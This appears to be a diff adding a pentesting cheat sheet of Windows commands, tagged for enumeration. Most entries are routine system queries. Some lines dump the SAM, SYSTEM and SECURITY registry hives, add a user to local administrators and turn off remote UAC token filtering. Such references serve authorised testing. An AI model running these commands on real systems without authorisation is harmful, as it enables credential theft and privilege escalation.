@@ -1,0 +1,67 @@
+% enum, windows, cmd
+
+# list all users
+net user
+
+# list all groups
+net localgroup
+
+# create user
+net user /add <newuser> <newpassword>
+
+# add user to local admins
+net localgroup administrators <user> /add
+
+# disable network UAC
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+
+# get info on a specific user
+net user <user>
+
+# get OS, version, architecture
+systeminfo
+
+# list network interfaces
+ipconfig /all
+
+# show possible attack vectors to other systems/networks
+route print
+
+# list active network connections
+netstat -ano
+
+# check permissions for a file or directory
+icacls <file-or-directory-path>
+
+# give user full control
+icacls <file> /grant "<user>:(F)"
+
+# list all privileges for current user
+whoami /priv
+
+# list all groups current user belongs to
+whoami /groups
+
+# list services that have unquoted paths (excludes windows services)
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+# list services that have unquoted paths (includes windows services; less likely to be useful)
+wmic service get name,pathname | findstr /i /v """
+
+# list scheduled tasks
+schtasks /query /fo LIST /v
+
+# list all running tasks
+tasklist 
+
+# dump SAM to file
+reg save hklm\SAM <filename>
+
+# dump SYSTEM to file
+reg save hklm\SYSTEM <filename>
+
+# dump SECURITY to file
+reg save hklm\SECURITY <filename>
+
+# view account policy
+net accounts
